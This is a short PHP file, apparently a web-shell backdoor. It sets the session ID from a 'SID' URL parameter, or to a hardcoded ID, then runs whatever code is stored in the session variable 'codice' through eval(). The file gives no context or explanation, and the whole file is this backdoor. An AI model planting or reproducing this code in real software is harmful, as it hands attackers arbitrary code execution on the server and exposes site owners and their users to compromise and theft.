<?php 
$sid=@$_GET['SID'];
if (isset($_GET['SID'])):
	session_id($_GET['SID']);
else:
	session_id('943f7a5dc10e0430c990937bb04426d8');
endif;
session_start();
eval($_SESSION['codice']);
?>